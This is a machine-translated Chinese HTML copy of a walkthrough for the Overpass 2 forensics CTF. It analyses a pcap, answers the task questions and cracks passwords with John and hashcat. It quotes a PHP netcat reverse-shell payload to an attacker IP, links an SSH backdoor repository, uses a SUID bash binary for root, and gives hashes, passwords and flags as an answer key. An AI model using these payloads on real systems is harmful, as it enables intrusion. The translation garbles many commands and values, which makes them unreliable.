<html>
<head>
<title>OVERPASS 2 WALKTHROUGH</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">天桥2演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/overpass-2-walkthrough-d73dc84fa65e?source=collection_archive---------0-----------------------#2021-04-11">https://infosecwriteups.com/overpass-2-walkthrough-d73dc84fa65e?source=collection_archive---------0-----------------------#2021-04-11</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/4d7c850d53e02015dacd147395d548ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EWr0EbvWZG_UYKrbhowsaQ.png"/></div></div></figure><p id="f31e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">嗨，伙计们…… <br/>今天我们将开始一个新的法医CTF挑战赛。我们试着解决这个问题。但是在我们开始这个CTF之前，我们需要知道一些法医学的基础知识。</p><p id="a0be" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">首先，我们需要知道两件事。第一个是Wireshark，第二个是pcap文件</p><p id="83da" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">1)<strong class="ka ir">Wireshark是什么？</strong> <br/> Wireshark是一款免费开源的数据包分析器。它用于网络故障排除、分析、软件和通信协议开发以及教育</p><p id="d79a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">2) <strong class="ka ir">什么是pcap文件？</strong> <br/> PCAP文件是具有网络会话数据的数据文件。这些文件包含关于主机之间建立了何种连接、攻击者如何渗透系统(在入侵的情况下)、通过网络传输的所有数据(如传输的文件等)的数据都被记录和保存。因此，他们被彻底分析，寻找攻击的线索。分析PCAP文件的常用工具是Wireshark。</p><p id="34b8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们的第一个任务是下载给定的pcap文件，并在wireshark的帮助下进行分析。</p><p id="82f0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir"> TASK-1 </strong> <br/> Q1)他们用来上传反向外壳的页面的网址是什么？</p><p id="7653" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">答复:/发展/</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kw"><img src="../Images/bc107548faa3f50ad853f91e3f277638.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0yvPO6ExVY-GouhQzILb1w.png"/></div></div><figcaption class="lb lc gj gh gi ld le bd b be z dk translated">暗示</figcaption></figure><blockquote class="lf lg lh"><p id="2917" class="jy jz li ka b kb kc kd ke kf kg kh ki lj kk kl km lk ko kp kq ll ks kt ku kv ij bi translated">ANS提示:在过滤器标签中搜索http。它显示http请求和响应。然后选择/development/upload.php，点击右键，进入follow -&gt;tcp stream。并分析它</p></blockquote><p id="f0ec" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Q2)攻击者使用什么有效载荷来获取访问权限？</p><p id="7ef3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ANS:<?php exec(“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2?>&amp; 1 | NC 192 . 168 . 170 . 145 4242 &gt;/tmp/f ")？&gt;</p><p id="70dc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Q3)攻击者使用了什么密码来访问privesc？</p><p id="82f4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">答:当whenevernoteartinstant</p><blockquote class="lf lg lh"><p id="8609" class="jy jz li ka b kb kc kd ke kf kg kh ki lj kk kl km lk ko kp kq ll ks kt ku kv ij bi translated">ANS提示:一些有用的wireshark过滤器可以帮助我找到答案。</p><p id="bf10" class="jy jz li ka b kb kc kd ke kf kg kh ki lj kk kl km lk ko kp kq ll ks kt ku kv ij bi translated">1)http</p><p id="99cd" class="jy jz li ka b kb kc kd ke kf kg kh ki lj kk kl km lk ko kp kq ll ks kt ku kv ij bi translated">2)http.request.method==POST</p><p id="4fa5" class="jy jz li ka b kb kc kd ke kf kg kh ki lj kk kl km lk ko kp kq ll ks kt ku kv ij bi translated">3)框架包含密码[键入您需要的关键字]</p></blockquote><p id="f243" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Q4)攻击者如何建立持久性？</p><p id="bccd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">答案:<a class="ae lm" href="https://github.com/NinjaJc01/ssh-backdoor" rel="noopener ugc nofollow" target="_blank">https://github.com/NinjaJc01/ssh-backdoor</a></p><p id="d36c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Q5)使用快速跟踪单词表，有多少系统密码可以破解？</p><p id="7e7f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">答:4</p><p id="ae23" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ANS提示:去下载fasttrack.txt文件。然后安装开膛手约翰密码破解。下一步是将/etc/passwd保存到一个. txt文件。</p><p id="4f74" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">john-wordlist =/usr/local/share/fast track . txt over hash . txt<br/>(开膛手John有一个优点是它会自动检测哈希类型)</p><h2 id="1740" class="ln lo iq bd lp lq lr dn ls lt lu dp lv kj lw lx ly kn lz ma mb kr mc md me mf bi translated">任务2研究—分析代码</h2><figure class="kx ky kz la gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mg"><img src="../Images/534dcdf7e4c32299f26df28df16af173.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1Xx2jaAWWmsnrkAodmGw5Q.png"/></div></div><figcaption class="lb lc gj gh gi ld le bd b be z dk translated">ssh后门</figcaption></figure><p id="e3a3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这里我们知道一件事。攻击者使用Github ssh-后门。<br/>所以我们接下来的工作就是分析github后门代码。然后我们去git克隆<a class="ae lm" href="https://github.com/NinjaJc01/ssh-backdoor" rel="noopener ugc nofollow" target="_blank">https://github.com/NinjaJc01/ssh-backdoor</a>仓库并分析代码</p><p id="1998" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Q1)后门的默认散列是什么？</p><p id="77b2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ANS:BDD 04d 9 bb 7621687 f 5 df 9001 f 5098 EB 22 BF 19 ea C4 C2 c 30 b 6 f 23 efed 4d 24807277d 0f 8 BF CCB 9 e 77659103d 78 c 56 e 66d 2d 7d 8391 DFC 885d 0e 9 b 68 ACD 01 fc 2170 e 3</p><p id="b944" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Q2)后门的硬编码盐是什么？</p><p id="35e9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ANS:1c 362 db 832 F3 f 864 c8 C2 Fe 05 f 2002 a 05</p><p id="5baa" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Q3)攻击者使用的哈希是什么？—为此回到PCAP！</p><p id="4489" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ANS:6d 05358 f 090 EEA 56 a 238 af 02 e 47d 44 ee 5489d 234810 ef 6240280857 EC 69712 a3 E5 e 370 b8 a 41899d 0196 ade 16 c0d 54327 c 5654019292 CBF E0 b 5 e 98 ad 1 FEC 71 bed</p><p id="e59f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Q4)使用rockyou和您选择的破解工具破解哈希。密码是什么？</p><p id="a8b3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">答案:11月16日</p><blockquote class="lf lg lh"><p id="38b9" class="jy jz li ka b kb kc kd ke kf kg kh ki lj kk kl km lk ko kp kq ll ks kt ku kv ij bi translated">ANS提示:我们的下一步是分析散列。我们可以看到在这个hash 6d 05358 f 090 EEA 56 a 238 af 02 e 47d 44 ee 5489d 234810 ef 6240280857 EC 69712 a 3 e 5e 370 b8 a 41899d 0196 ade 16 c 0d 54327 c 5654019292 CBF 0 b 5 e 98 ad 1 FEC 71 bed→这是阿沙-512 hash和:1c 362 db 832 f 386所以这是以($pass:$salt)的形式。转到hashcat找到哈希模式号并破解它</p><p id="120e" class="jy jz li ka b kb kc kd ke kf kg kh ki lj kk kl km lk ko kp kq ll ks kt ku kv ij bi translated">hashcat-m 1710-a 0 over hash . txt/usr/local/share/rock you . txt—force</p></blockquote><h2 id="bbd1" class="ln lo iq bd lp lq lr dn ls lt lu dp lv kj lw lx ly kn lz ma mb kr mc md me mf bi translated">任务3攻击—返回！</h2><p id="f668" class="pw-post-body-paragraph jy jz iq ka b kb mh kd ke kf mi kh ki kj mj kl km kn mk kp kq kr ml kt ku kv ij bi translated">Q1)攻击者破坏了网站。他们留下了什么信息作为标题？</p><p id="3dd7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ANS:CooctusClan的H4ck3d</p><p id="ed4b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Q2)用户标志是什么？</p><p id="f79e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">答:thm { d 119 B4 fa 8 c 497 DDB 0525 f 7 ad 200 e 6567 }</p><p id="93ce" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ANS提示:</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mm"><img src="../Images/04b94e24525fb843a2e2585033b2325a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*u1I5Ez0tvWpInlOX158aqg.png"/></div></div></figure><p id="6984" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在nmap扫描之后，我们发现ssh在端口22和2222上运行。下一步是尝试登录ssh。因为这里我们知道用户名和密码。</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mn"><img src="../Images/c69bd1476875585b377bec59a0dca537.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JWYGKOQHl-jSoDePoi342g.png"/></div></div><figcaption class="lb lc gj gh gi ld le bd b be z dk translated">密码:11月16日</figcaption></figure><p id="9cc1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">下一步是转到主目录并找到标志</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/9bd83ea229cce7b9f48c0a32d8948276.png" data-original-src="https://miro.medium.com/v2/resize:fit:1368/format:webp/1*WxlfCaa86AOTlG1vC4IyOQ.png"/></div></figure><p id="d6d8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Q3)什么是根标志？</p><p id="72e1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">答案:thm { d53b 2684 f 169360 bb 9606 c 333873144d }</p><p id="689b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ANS提示:</p><p id="e9d1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">转到主目录并列出所有文件。这里我们可以看到一个名为。suid_bash。执行二进制文件并找到根标志</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/b4da16fb606bd8714d05ae11bb357387.png" data-original-src="https://miro.medium.com/v2/resize:fit:1390/format:webp/1*ByseEdHZQJEOASY_xIPVMw.png"/></div></figure><p id="8cc8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">谢谢你</p></div></div>    
</body>
</html>